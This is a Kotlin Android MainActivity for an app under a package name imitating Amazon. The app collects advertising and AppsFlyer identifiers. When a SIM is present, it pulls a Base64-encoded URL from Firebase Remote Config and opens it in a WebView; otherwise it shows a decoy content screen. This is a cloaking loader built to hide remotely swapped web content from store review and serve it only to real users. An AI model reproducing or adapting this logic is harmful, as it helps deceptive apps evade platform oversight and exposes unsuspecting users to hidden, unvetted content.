package com.amazoni.islandot

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import com.amazoni.islandot.databinding.ActivityMainBinding
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.amazoni.islandot.refacContent.RefacContent
import com.amazoni.islandot.refacUtils.RefacPref
import com.amazoni.islandot.refacWebView.RefacWebView
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.onesignal.OneSignal
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.util.HashMap

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private val mainTag: String = "RefMainActivity"
    private lateinit var refMainPref: RefacPref
    private val uiScope = CoroutineScope(Dispatchers.IO)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        uiScope.launch {
            val dispatcher = this.coroutineContext
            CoroutineScope(dispatcher).launch {
                val info = AdvertisingIdClient.getAdvertisingIdInfo(this@MainActivity)
                val idAds = info.id

                val appsID = AppsFlyerLib.getInstance().getAppsFlyerUID(this@MainActivity)

                refMainPref.advertiseID = idAds
                refMainPref.appsFlyID = appsID
                Log.d(mainTag, "AdvesID: ${refMainPref.advertiseID}")
                Log.d(mainTag, "AppsID: ${refMainPref.appsFlyID}")
            }
        }

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        refMainPref = RefacPref(this)

        checkCampaign()

        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as
                TelephonyManager

        //telephonyManager.simState != 0 || telephonyManager.simState != 1

        if (telephonyManager.simState == 5) {
            Log.d(mainTag, "SimState: ${telephonyManager.simState}")
            if (refMainPref.refacMyDeep.isEmpty()) {
                initRemoteConfig()
            } else {
                val intent = Intent(this, RefacWebView::class.java)
                intent.putExtra("refUrl", refMainPref.refacMyDeep)
                Log.i(mainTag, "Preferences: ${refMainPref.refacMyDeep}")
                Log.i(mainTag, "Preferences: ${refMainPref.remoteKey}")
                startActivity(intent)
            }
        } else {
            Log.d(mainTag, "SimState: ${telephonyManager.simState}")
            startActivity(Intent(this, RefacContent::class.java))
        }

        refInitOneSignal()
    }

    private fun checkCampaign() {


        val conversionDataListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                Log.d(mainTag, "onConversionDataSuccess")
            }

            override fun onConversionDataFail(p0: String?) {
                Log.d(mainTag, "onConversionDataFail")
//                initRemoteConfig()
            }

            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
                Log.d(mainTag, "onAppOpenAttribution: $p0")
            }

            override fun onAttributionFailure(p0: String?) {
                Log.d(mainTag, "onAttributionFailure: $p0")
            }

        }
        val devKey = ""
        AppsFlyerLib.getInstance().init(devKey, conversionDataListener, this)
        AppsFlyerLib.getInstance().start(this)

    }

    private fun initRemoteConfig() {
        val defaults = HashMap<String, Any>()
        defaults["target_url"] = "moreUrl"
        FirebaseRemoteConfig.getInstance().setDefaultsAsync(defaults)
        FirebaseRemoteConfig.getInstance().fetchAndActivate().addOnCompleteListener(this) { task ->
            if (task.isSuccessful) {
                val updated = task.result
                Log.d(mainTag, "Config params updated:$updated")
            }
            Log.d(mainTag, "task is success: ${task.isSuccessful}")
            val url = FirebaseRemoteConfig.getInstance().getString("")
            Log.d(mainTag, "Url from Firebase: $url")
            refCheckUrl(url)
        }
    }

    private fun refInitOneSignal() {
        val appID = ""
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        OneSignal.setAppId(appID)
    }

    private fun refCheckUrl(url: String) {

        if (url.isEmpty()) {
            Log.d(mainTag, "Remote config is empty")
            startActivity(Intent(this, RefacContent::class.java))
        } else {
                val decodeUrl = decodeUrl(url)
            val intent = Intent(this, RefacWebView::class.java)
            intent.putExtra("refUrl", decodeUrl)
            refMainPref.refacMyDeep = decodeUrl
            Log.i(mainTag, "Main URL: $decodeUrl")
            startActivity(intent)
        }
    }

    private fun decodeUrl(codeUrl: String): String {
        val byteUrl = Base64.decode(codeUrl, 1)
        return String(byteUrl)
    }
}